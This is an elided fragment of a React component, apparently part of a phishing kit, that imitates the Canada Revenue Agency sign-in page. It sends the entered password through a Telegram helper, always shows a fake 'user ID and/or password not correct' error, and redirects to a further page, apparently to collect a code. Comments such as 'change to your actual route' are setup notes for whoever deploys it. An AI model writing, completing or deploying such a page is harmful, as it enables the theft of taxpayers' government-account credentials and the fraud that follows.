...
import { sendTelegramMessage } from "../../utils1/telegram"; // adjust path
...
export default function CRASignInTelegram() {
  ...
  const [error, setError] = useState("The CRA user ID and/or password you entered are not correct.");
...
🔑 Password: ${password}
    ...
    try {
      ...
      router.push("/cracode1"); // change to your actual route
    } catch (err) {
      console.error(err);
            ...
            <div className="flex flex-col sm:flex-row gap-4 mb-6">
              ...
              <button
                ...
                onClick={() => {
                  setUserId("");
                  setPassword("");
                  // Reset to default error message when form is cleared
                  setError("The CRA user ID and/or password you entered are not correct.");
                }}
